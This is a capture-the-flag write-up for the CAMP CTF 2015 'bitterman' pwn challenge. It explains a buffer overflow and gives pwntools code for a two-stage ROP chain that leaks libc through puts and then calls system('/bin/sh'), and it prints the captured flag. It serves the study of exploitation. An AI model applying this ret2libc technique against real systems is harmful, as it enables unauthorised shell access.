# CAMP CTF 2015: bitterman-300

**Category:** Pwn
**Points:** 300
**Solves:** 31
**Description:**

> Can you exploit this one for me? [bitterman](bitterman) is running on challs.campctf.ccc.ac:10103 This time NX is enabled, to make sure it's not too easy. Here's the [libc](libc.so.6).


## Write-up

by [ctfhacker](https://github.com/ctfhacker)

# Bitterman

## Recon

Upon connecting, we are given a prompt which asks for the following items:
* Name
* Length of a message
* The message itself

As per normal, let's try the low hanging fruit of throwing lots of data at each field to see if we get a crash.

Turns out, if we say that we will send 1024 bytes and send 1024 bytes, we crash *shrug* (If there is time after the CTF, I'll go back and see what exactly caused the crash)

## Exploit

Because NX is turned on, we need to do some fancy ROP. Our ROP strategy is below:
* Leak a libc address via ROPing to `puts()` with `puts` as the parameter. 
    - This will return the address of `puts` in the libc the binary is using. 
    - We can calculate the libc base address since we were given their libc in the problem (leaked_libc_read_address - original_libc_from_challenge = base_libc_on_server)
* Call main so we can re-exploit with the knowledge of the libc base address.

This ROP construction is here:
```python
from pwn import *

elf = ELF('./bitterman')
rop = ROP(elf)

rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])

print rop.dump()
```

Leaking the address from this ROP chain and rebasing the libc address in pwntools is below:
```python
# Be sure to add the zeros that we miss due to string read
# Grab the first 8 bytes of our output buffer
leaked_puts = r.recv()[:8].strip().ljust(8, '\x00')

# Convert to integer
leaked_puts = struct.unpack('Q', leaked_puts)[0]

# Rebase libc to the leaked offset
libc.address = leaked_puts - libc.symbols['puts']
```

From here, we can create a second ROP which will simply call `system` with `/bin/sh`. Luckily, `/bin/sh` is in libc, so we simply find where that string is, and call `system` with it.

The second ROP construction is below:

```python
# Create new ROP object with rebased libc
rop2 = ROP(libc)

# Call system('/bin/sh')
rop2.system(next(libc.search('/bin/sh\x00')))

print rop2.dump()
```

Our shell is received and the flag is given:

```python
$ ls
bitterman
flag.txt
run.sh
$ cat flag.txt
CAMP15_a786be6aca70bfd19b6af86133991f80
```

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/campctf-2015-bitterman/> 
* <https://github.com/thebarbershopper/ctf-writeups/tree/master/campctf-2015/bitterman-pwn-400>
* [Chinese](http://www.cnhackmy.com/hacked/CTF/2015/09/12/00001675.html)
